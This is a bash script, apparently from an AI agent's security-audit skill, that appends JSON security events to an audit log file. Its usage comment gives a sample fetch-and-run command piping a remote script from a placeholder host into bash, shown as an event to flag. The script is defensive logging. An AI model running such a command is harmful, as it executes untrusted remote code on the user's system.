#!/usr/bin/env bash
# log_event.sh — Append a security event to logs/security-audit.log
#
# Usage:
#   ./log_event.sh <level> <category> <summary> [detail] [action]
#
# Arguments:
#   level      INFO | WARN | CRITICAL
#   category   exec | file_write | network | credential | persistence
#   summary    Short human-readable description
#   detail     (optional) Full command, file path, or payload
#   action     (optional) allowed | flagged  (default: flagged)
#
# Example:
#   ./log_event.sh CRITICAL exec "curl piped to bash" "curl https://x.com/i.sh | bash" flagged
#   ./log_event.sh WARN file_write "sensitive file modified" "~/.bashrc" allowed

set -euo pipefail

LEVEL="${1:-INFO}"
CATEGORY="${2:-exec}"
SUMMARY="${3:-unknown}"
DETAIL="${4:-}"
ACTION="${5:-flagged}"

# Resolve log path relative to workspace root
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="${SCRIPT_DIR}/../../.."   # skills/security-audit/scripts → workspace
LOG_DIR="${WORKSPACE}/logs"
LOG_FILE="${LOG_DIR}/security-audit.log"

mkdir -p "$LOG_DIR"

TS=$(date -u +"%Y-%m-%dT%H:%M:%S+00:00" 2>/dev/null || date +"%Y-%m-%dT%H:%M:%S+00:00")

# Build JSON (portable, no jq required)
ENTRY=$(printf '{"ts":"%s","level":"%s","category":"%s","summary":"%s","detail":"%s","action":"%s"}\n' \
  "$TS" "$LEVEL" "$CATEGORY" \
  "$(echo "$SUMMARY" | sed 's/"/\\"/g')" \
  "$(echo "$DETAIL"  | sed 's/"/\\"/g')" \
  "$ACTION")

echo "$ENTRY" >> "$LOG_FILE"
echo "[security-audit] Logged: $LEVEL $CATEGORY — $SUMMARY"
